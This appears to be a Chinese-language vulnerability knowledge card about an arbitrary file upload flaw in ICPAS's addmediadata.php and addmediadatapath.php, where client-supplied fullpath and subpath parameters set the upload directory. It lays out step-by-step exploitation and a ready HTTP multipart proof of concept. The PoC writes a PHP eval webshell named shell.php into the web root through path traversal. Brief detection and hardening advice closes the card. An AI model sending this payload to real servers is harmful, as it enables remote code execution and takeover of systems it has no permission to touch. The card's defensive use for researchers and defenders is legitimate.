---
id: web-generic-file-upload-icpas-addmediadata-fullpath-upload-arbitrary-write
title: ICPAS addmediadata.php / addmediadatapath.php：POST subpath/fullpath 控制上传目录，move_uploaded_file 任意路径写 PHP
type: scenario
domain: web
path: web/generic/file-upload
technique: icpas-addmediadata-fullpath-controlled-upload
aliases:
- ICPAS addmediadata 任意上传
- addmediadatapath 目录可控
- subpath fullpath 上传穿越
- MediaFiles TeleVoiceMedia webshell
tags:
- php
- file-upload
- arbitrary-file-write
- path-traversal
- webshell
- icpas
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V474
  verified_at: '2026-11-10T17:22:50+08:00'
  notes: 已对照原文图09/10/13核对；subpath/fullpath 控目录+mkdir 0777+move_uploaded_file 任意写成立；--force 理由成立：与 uploadjson（jsondata[filename]+fopen/fwrite）端点/参数/sink 均不同，非同链，并列保留；已把 500m 常量修正为 524288000(原文图09)；PoC 为构造性，原文未实际上传验证
---

## 一句话结论

ICPAS 的 `php/addmediadata.php` 和 `php/addmediadatapath.php` 不只把上传文件名拼到固定目录：它们还直接使用 POST 的 `subpath` 与 `fullpath` 作为上传落点目录，非空时覆盖默认的 `AppServer\MediaFiles\` / `AppServer\TeleVoiceMedia\`，然后 `mkdir(0777, recursive)` 并 `move_uploaded_file`；攻击者把 `fullpath` 指到 Web 根或任意可写目录、文件名写成 `shell.php`，即可任意路径写入可执行 PHP。

## 原理

- **目录拼装**：代码在 Windows 下取 `$subpath = $_POST['subpath']."\\"`、`$fullpath = $_POST['fullpath']."\\"`；Linux 下用 `/`。若未传 `fullpath`，默认取脚本上四级目录 + `AppServer\MediaFiles\`（addmediadata）或 `AppServer\TeleVoiceMedia\`（addmediadatapath）。
- **落点计算**：`$mediapath = $fullpath.$subpath`；Linux 侧把 `///` 与 `//` 反复替换成 `/`；若目录不存在则 `mkdir($mediapath, 0777, true)`；`$mediafile = $mediapath.basename($file_name)`；最后 `move_uploaded_file($file_tmp_name, $mediafile)`。
- **为什么是任意写**：`fullpath`/`subpath` 完全来自 POST，没有黑名单或基准目录校验；攻击者可传 `fullpath=../../` 或绝对路径（如 `C:\wnmp\www\`），把文件放到 Web 可访问目录。`subpath` 还可再拼接子目录。
- **文件名限制很弱**：只去掉空格（`str_replace(" ", "", $file_name)`），不校验扩展名、MIME、内容；`basename()` 只取文件名，但不阻止 `shell.php`、`.htaccess` 等。
- **其它细节**：上传包体大小上限约 500MB（`524288000` 判断的是 `CONTENT_LENGTH`）；成功后把 `$subpath.basename($file_name)` 通过 UDP 通知 `addmediadata` 服务并返回 JSON。`addmediadatapath.php` 的差别只是默认目录为 `TeleVoiceMedia`，漏洞形态相同。
- 同系统的 `addscenedata.php` 是把文件名拼进固定 `../images/scene/`；本组接口更危险之处在于**目录本身可控**，即使默认目录不在 Web 根内也能改写 `fullpath` 落到 Web 根。

## 触发条件

- 目标为 ICPAS，`php/addmediadata.php` 或 `php/addmediadatapath.php` 可访问（认证要求取决于部署，原文未展开）。
- PHP 进程对目标目录有写权限；`move_uploaded_file` 未被 `open_basedir` 限制。
- 攻击者能发送 multipart POST，控制 `subpath`/`fullpath` 与上传文件名。

## 利用步骤

1. 探测接口与默认落点（不传 `fullpath` 时观察返回的 `file` 路径）。
2. 确定 Web 根相对脚本的路径（如 `../../` 或 `C:\wnmp\www\`）。
3. 发送 multipart：`fullpath` 设为 Web 根，`subpath` 可留空或设子目录，文件字段名 `file`，文件名 `shell.php`。
4. 访问 `http://target/shell.php` 验证执行。
5. 若 `addmediadata` 的默认目录不可写，改试 `addmediadatapath` 或 `addscenedata` 的固定目录。

## PoC

```http
POST /php/addmediadata.php HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="fullpath"

../../../
------x
Content-Disposition: form-data; name="subpath"

wnmp/www
------x
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

<?php @eval($_POST['cmd']); ?>
------x--
```

## 变体与关联

- 变体：`addmediadatapath.php` 默认目录换成 `TeleVoiceMedia`，同样可用 `fullpath`/`subpath` 改写。
- 变体：`my_parser.php` 用固定 `./files/` + 原始文件名，属于文件名路径穿越；`addscenedata.php` 用固定 `../images/scene/`。
- 关联：[[web-generic-file-upload-icpas-addscenedata-php-webshell]]（同产品固定目录上传；该卡变体节曾认为 addmediadata 默认目录在 Web 根外，本卡补充了 `fullpath` 可控导致可落到任意目录）。
- 关联：[[web-generic-file-upload-icpas-uploadjson-path-traversal-arbitrary-write]]（同产品 JSON 写文件）。

## 检测与防御

- 检测：请求含 `subpath`、`fullpath` 参数且值含 `..`、绝对路径或 `AppServer` 之外目录；上传文件名以 `.php` 等可执行扩展名结尾；`move_uploaded_file` 后的新文件出现在 Web 根。
- 检测：Web 目录出现非业务新增 PHP 文件；文件写入审计/EDR 监控。
- 防御：上传目录固定为服务端配置且不接受客户端路径参数；`basename()` + `realpath()` 校验落点前缀；扩展名/MIME/内容白名单；上传目录禁止脚本执行（Nginx/Apache 配置）；升级修复版本。
